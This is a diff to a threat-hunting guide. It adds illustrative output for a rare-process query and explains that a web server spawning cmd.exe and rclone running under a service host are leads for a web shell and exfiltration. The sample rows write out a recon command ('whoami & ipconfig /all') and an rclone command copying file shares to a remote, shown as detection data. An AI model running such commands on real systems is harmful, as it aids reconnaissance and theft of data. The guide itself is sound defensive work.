@@ -81,6 +81,17 @@ DeviceProcessEvents
 | where HostCount <= 3
 | sort by HostCount asc, ExecutionCount asc
 ```
+Example output (illustrative values — your rows will differ):
+
+```text
+InitiatingProcessFileName  FileName     HostCount  ExecutionCount  SampleHosts      SampleCommands
+w3wp.exe                   cmd.exe      1          3               ["web-pub-01"]   ["cmd.exe /c whoami & ipconfig /all"]
+svchost.exe                rclone.exe   1          1               ["fs-02"]        ["rclone.exe copy D:\Shares remote:bkp"]
+explorer.exe               putty.exe    2          9               ["ws-114",...]   ["putty.exe -ssh admin@10.20.9.5"]
+```
+
+The web server spawning `cmd.exe` with recon commands (a web shell) and `rclone` under a service host (exfiltration
+tooling) are the leads; `putty` from two admin workstations is ordinary and goes on the allow-list.
 
 ### Splunk (SPL): Rare Web Server Child Processes (Web Shell Hunting)
 
